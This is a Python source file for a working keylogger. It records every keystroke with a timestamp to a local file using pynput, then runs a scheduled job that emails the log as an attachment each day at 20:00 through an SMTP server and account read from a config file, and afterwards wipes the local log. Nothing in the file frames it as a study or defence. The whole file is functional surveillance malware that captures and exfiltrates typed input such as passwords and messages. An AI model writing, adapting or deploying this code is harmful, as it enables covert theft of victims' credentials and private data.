import pynput.keyboard as Keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import schedule
import time
import multiprocessing
from configparser import ConfigParser


def message():
    # Read config.ini file
    config_object = ConfigParser()
    config_object.read("config.ini")
    userinfo = config_object["USERINFO"]

    fromaddr = userinfo["email"]
    toaddr = userinfo["email"]

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log"

    # string to store the body of the mail
    body = "Here is the requested log!"

    msg.attach(MIMEText(body, 'plain'))

    filename = "keylog.txt"
    attachment = open("keylog.txt", "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())
    attachment.close()

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    config_object = ConfigParser()
    config_object.read("config.ini")
    connection = config_object["CONN"]
    server = connection["server"]
    port = int(connection["port"])

    s = smtplib.SMTP(server, port)

    s.starttls()

    s.login(fromaddr, userinfo["pass"])

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

    f = open("keylog.txt", "w")
    f.write('')
    f.close()


def keyed():
    def on_press(key):
        f = open("keylog.txt", "a")
        try:
            f.write(f'{datetime.now().strftime("%d/%m/%Y %H:%M:%S")} - {key.char} \n')
        except AttributeError:
            f.write(f'{datetime.now().strftime("%d/%m/%Y %H:%M:%S")} - {key} \n')
        f.close()

    def on_release(key):
        print(f'Key {key}')
        if key == Keyboard.Key.esc:
            # Stop the listener
            return False

    with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def message_sent():
    schedule.every().day.at("20:00").do(message)

    while True:
        schedule.run_pending()
        time.sleep(1)


if __name__ == '__main__':
    p1 = multiprocessing.Process(name='p1', target=keyed)
    p = multiprocessing.Process(name='p', target=message_sent)
    p1.start()
    p.start()
